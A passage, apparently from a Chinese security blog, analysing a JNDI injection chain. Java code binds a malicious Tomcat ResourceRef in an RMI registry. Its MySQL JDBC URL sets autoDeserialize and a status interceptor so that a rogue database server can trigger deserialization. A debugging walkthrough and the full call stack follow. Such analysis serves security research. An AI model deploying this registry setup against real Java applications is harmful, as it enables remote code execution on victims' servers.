Registry registry = LocateRegistry.createRegistry(1099);ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "", true,        "org.apache.naming.factory.ResourceFactory", null);ref.add(new StringRefAddr("driverClassName", "com.mysql.cj.jdbc.Driver"));String JDBC_URL = "jdbc:mysql://127.0.0.1:3309/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&useSSL=false";ref.add(new StringRefAddr("url", JDBC_URL));ref.add(new StringRefAddr("username", "root"));ref.add(new StringRefAddr("initialSize", "1"));ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);registry.bind("calc", referenceWrapper);
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd67p4oTLMoJ4t6ibol2scJZZkXBqz6dgDxiayErJccN3A88ap5GYnKpDjEibuRZsS9SkSJxwFlkGSE3BG5tCPW6oD2eHpNDuu0wC8/640?wx_fmt=png&from=appmsg "")  
  
调试分析  
  
这里的classFactoryLocation 属性为空，绕过了if判断  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4iaicSy4KVOxeibgibcKbDCjjSQa8Sh50z605kictUVYtWVn0dicL1Z4PJdelRuLVUoSlicxTr6tAyydCz0bOyiae9ATzkIsUlFBz4owU/640?wx_fmt=png&from=appmsg "")  
  
这里成功返回了工厂  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd6YIReicgkpaRzGvJjhYM8iakM67JdywpaOzdyGHQF9jdEoawbCcQ7pE9Ne3GwrUN66balDT3tXxt9tbzmwBk79zDD4I3Vicsn6IA/640?wx_fmt=png&from=appmsg "")  
  
接着调用getObjectInstance() 方法，先判断类型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7rz7WibkkdMJPvZiajvuHBGDbbFNnVtM7JQibb6wNk0gAiaquFfWjYgPNByc4008ib7ryVv00lGfj6C9RHQvj80ibMgMEYMJyYrGIao/640?wx_fmt=png&from=appmsg "")  
  
接着跟进  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7YKq1bS0C1ibByjqOHfBIicCZORZT5Ydprib7kyPwH01XBu67Me68ENPUbMKLgTX1gVxZ5q6OQLtv97d9Rag7AZlLE6qRwzIU59s/640?wx_fmt=png&from=appmsg "")  
  
判断是不是javax.sql.DataSource，这里是  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd6eNulhToibQgWdTbqXT12w9nhib3pYPiaTLiaaBcOEP4RGlOSZ8JDgAu76r5p3YDhu4Ru1qwBxLVGRZVKxVBeA3o64Bic4eLUriaL9w/640?wx_fmt=png&from=appmsg "")  
  
赋值为BasicDataSourceFactory  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5Xx6AjpbxCZfalBUwra99JicnP19MvDf7nY64p5uJbbvf1RZyKdWGqibj6icUkwfygdF2ONBJE1ToplK4ZPqicwqDrE30UXv97iaMc/640?wx_fmt=png&from=appmsg "")  
  
成功返回  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5Rs9bJx09hBrEvRfBcC7XN8S5YKEm3vK0X7hJNoFEeuYvxGZsUSmfGibErgkyB9pt2r7KnPaWia8Kl34HFI93UPfsr0nVIJoAEk/640?wx_fmt=png&from=appmsg "")  
  
接着又调用BasicDataSourceFactory的getObjectInstance() 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd4rcUdFwHhth2ztBmEXIjIMTibicuk1ib6WMPicBW8EInQIHmhR4VAS3icfCwOsK4JdN61shnETutlvGJSv4ibiabTT3pIMfVvXbVchPo/640?wx_fmt=png&from=appmsg "")  
  
最终触发jdbc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7czG0t4Ppf1AsCPn6yjZ0LEP0NkjCibEiaUkjqZJOySrDAp3p3wIRyehHu7llOV7XTuDicygZT3oib18M2htpBbfe0ibQuc9EXW3Nk/640?wx_fmt=png&from=appmsg "")  
  
最终调用栈  
```
createDataSource:339, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2)getObjectInstance:275, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2)getObjectInstance:94, FactoryBase (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:14, JNDI_Test (JNDI)
```  
  
  
  
